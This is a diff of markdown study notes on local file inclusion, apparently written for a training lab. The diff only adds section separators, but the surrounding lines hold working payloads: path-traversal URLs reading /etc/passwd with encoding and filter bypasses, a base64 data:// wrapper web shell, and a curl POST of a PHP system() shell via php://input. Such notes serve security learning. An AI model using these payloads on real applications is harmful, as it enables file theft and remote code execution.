@@ -89,6 +89,7 @@ http://94.237.49.23:48568/index.php?language=..././..././..././..././etc/passwd
 # Bypass (Windows): ....\/
 http://94.237.49.23:48568/index.php?language=....\/....\/....\/....\/etc/passwd
 ```
+---
 
 ### Character Blacklist Filter
 
@@ -109,6 +110,8 @@ http://94.237.49.23:48568/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2
 ```
 
 The above payload may work when input validation is performed before URL decoding, or when decoding is incomplete. In some cases, it is worth double or even triple URL encoding the payload. 
+
+---
 
 ### Approved Paths Filter
 
@@ -157,6 +160,8 @@ http://83.136.253.59:34423/index.php?language=languages/....\/....\/....\/....\/
 http://83.136.253.59:34423/index.php?language=languages%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%65%74%63%2f%70%61%73%73%77%64
 ```
 
+---
+
 ### Appended Extensions Filter
 
 Some filters append file extensions (e.g. `.php`) to user-supplied input before including a file. This makes basic LFI attacks more difficult on modern PHP versions.
@@ -200,6 +205,7 @@ http://83.136.253.59:34423/index.php?language=languages%2f%2e%2e%2e%2e%2f%2f%2e%
 ```
 
 ---
+
 ## PHP Wrappers
 
 ### PHP Stream Wrappers
@@ -249,6 +255,8 @@ echo '<string>' | base64 -d
 ![Filtered output](images/source-code.png)
 
 The `php://filter` does not provide code execution by itself, but is commonly used for information disclosure and source code analysis, which may lead to further exploitation.
+
+---
 
 ### PHP Data Wrapper
 
@@ -312,6 +320,8 @@ http://94.237.55.43:35886/index.php?language=data://text/plain;base64,%50%44%39%
 http://94.237.55.43:35886/index.php?language=data://text/plain;base64,%50%44%39%77%61%48%41%67%63%33%6c%7a%64%47%56%74%4b%43%52%66%52%30%56%55%57%79%4a%6a%62%57%51%69%58%53%6b%37%49%44%38%2b%43%67%3d%3d&cmd=cd+../../../;cat+/etc/passwd
 ```
 
+---
+
 ### PHP Input Wrapper
 
 The PHP **input wrapper** (`php://input`) is similar to the **data wrapper**, in that it can also be abused to achieve remote code execution. The key difference is how data is supplied:
@@ -335,3 +345,7 @@ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.55.43:358
 ```
 
 Unlike `php://filter`, the `php://input` wrapper allows direct code execution and is therefore a high-impact LFI escalation technique when enabled.
+
+---
+
+### PHP Expect Wrapper
